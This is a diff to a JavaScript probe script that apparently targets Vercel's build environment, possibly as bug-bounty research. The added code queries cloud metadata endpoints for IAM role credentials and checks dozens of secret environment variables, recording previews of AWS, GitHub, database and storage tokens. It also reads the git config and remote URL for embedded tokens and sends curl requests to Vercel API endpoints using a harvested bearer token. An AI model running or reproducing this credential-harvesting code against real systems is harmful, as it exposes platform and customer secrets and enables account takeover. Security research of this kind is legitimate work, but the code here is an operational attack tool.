@@ -277,9 +277,9 @@ const report = {
     ).toString().trim());
     const putBody = safe(() => readFileSync('/tmp/art_put', 'utf8').slice(0, 200));
 
-    // Events POST — record cache events
+    // Events POST — record cache events (payload must be top-level array per Turborepo spec)
     const eventsStatus = safe(() => execSync(
-      `curl -s --max-time 8 -o /tmp/art_events -w '%{http_code}' -X POST -H 'Authorization: Bearer ${tok}' -H 'Content-Type: application/json' -H 'x-artifact-client-ci: vercel' '${apiBase}/events?teamId=${ownerId}' -d '{"sessionId":"probe-bounty","source":"LOCAL","event":[{"sessionId":"probe","duration":1,"hash":"deadbeef1234deadbeef1234deadbeef12345678","tag":"HIT"}]}' 2>/dev/null || true`
+      `curl -s --max-time 8 -o /tmp/art_events -w '%{http_code}' -X POST -H 'Authorization: Bearer ${tok}' -H 'Content-Type: application/json' -H 'x-artifact-client-ci: vercel' '${apiBase}/events?teamId=${ownerId}' -d '[{"sessionId":"probe-bounty","source":"LOCAL","duration":1,"hash":"deadbeef1234deadbeef1234deadbeef12345678","event":"HIT"}]' 2>/dev/null || true`
     ).toString().trim());
     const eventsBody = safe(() => readFileSync('/tmp/art_events', 'utf8').slice(0, 200));
 
@@ -455,6 +455,64 @@ const report = {
       // Try mmds-specific paths (Firecracker custom paths)
       mmdsRoot: probe('/'),
       mmdsCustom: probe('/latest/custom/'),
+      // IAM role listing — does Firecracker MMDS expose the host EC2 IAM role?
+      // If present: AWS credentials for Vercel's account accessible from build VM
+      iamRoleList: probe('/latest/meta-data/iam/security-credentials/'),
+      iamRoleInfo: probe('/latest/meta-data/iam/info'),
+      instanceId: probe('/latest/meta-data/instance-id'),
+    };
+  }),
+  // Additional Vercel env vars that may contain secrets or reveal scope
+  additionalCreds: safe(() => {
+    const check = (k) => process.env[k] ? `present(len=${process.env[k].length},preview=${process.env[k].slice(0,20)}...)` : 'absent';
+    return {
+      // Vercel Blob storage token (if project uses Blob storage)
+      BLOB_READ_WRITE_TOKEN: check('BLOB_READ_WRITE_TOKEN'),
+      VERCEL_BLOB_READ_WRITE_TOKEN: check('VERCEL_BLOB_READ_WRITE_TOKEN'),
+      // KV / Edge Config tokens
+      EDGE_CONFIG: check('EDGE_CONFIG'),
+      KV_REST_API_URL: check('KV_REST_API_URL'),
+      KV_REST_API_TOKEN: check('KV_REST_API_TOKEN'),
+      KV_URL: check('KV_URL'),
+      // Postgres / Neon tokens
+      POSTGRES_URL: check('POSTGRES_URL'),
+      POSTGRES_PRISMA_URL: check('POSTGRES_PRISMA_URL'),
+      DATABASE_URL: check('DATABASE_URL'),
+      // GitHub tokens that might be injected by Vercel
+      VERCEL_GIT_PROVIDER_TOKEN: check('VERCEL_GIT_PROVIDER_TOKEN'),
+      GITHUB_TOKEN: check('GITHUB_TOKEN'),
+      GH_TOKEN: check('GH_TOKEN'),
+      // Git remote URL (may contain embedded token)
+      gitRemoteOrigin: safe(() => execSync('git remote get-url origin 2>/dev/null || true').toString().trim()).slice(0, 200),
+      // Path0 git config (project repo git config — may contain ghs_ or ghp_ token)
+      path0GitConfig: safe(() => readFileSync('/vercel/path0/.git/config', 'utf8')).slice(0, 500),
+      // Internal env vars suggesting token types
+      VERCEL_DEPLOY_TOKEN: check('VERCEL_DEPLOY_TOKEN'),
+      AWS_ACCESS_KEY_ID: check('AWS_ACCESS_KEY_ID'),
+      AWS_SECRET_ACCESS_KEY: check('AWS_SECRET_ACCESS_KEY'),
+      AWS_SESSION_TOKEN: check('AWS_SESSION_TOKEN'),
+    };
+  }),
+  // Spaces API probe — VERCEL_ARTIFACTS_TOKEN has API_SPACES_RUN_UPLOAD capability
+  spacesProbe: safe(() => {
+    const tok = process.env.VERCEL_ARTIFACTS_TOKEN;
+    if (!tok) return 'no-artifacts-token';
+    const ownerId = process.env.VERCEL_ARTIFACTS_OWNER || '';
+    const deployId = process.env.VERCEL_DEPLOYMENT_ID || '';
+    const probe = (url, method = 'GET', body = null) => {
+      const bodyFlag = body ? `-d '${body}'` : '';
+      const contentType = body ? "-H 'Content-Type: application/json'" : '';
+      const st = safe(() => execSync(
+        `curl -s --max-time 8 -X ${method} ${contentType} -o /tmp/sp_${method.toLowerCase()} -w '%{http_code}' -H 'Authorization: Bearer ${tok}' ${bodyFlag} '${url}' 2>/dev/null || true`
+      ).toString().trim());
+      const bd = safe(() => readFileSync(`/tmp/sp_${method.toLowerCase()}`, 'utf8').slice(0, 200));
+      return { status: st, body: bd };
+    };
+    // Try spaces-related endpoints that might correspond to API_SPACES_RUN_UPLOAD capability
+    return {
+      spacesV1: probe(`https://vercel.com/api/v1/spaces?teamId=${ownerId}`),
+      spacesV1Runs: probe(`https://vercel.com/api/v1/spaces/runs?teamId=${ownerId}`),
+      spacesDeployRun: probe(`https://vercel.com/api/v1/spaces/runs/${deployId}?teamId=${ownerId}`),
     };
   }),
 };
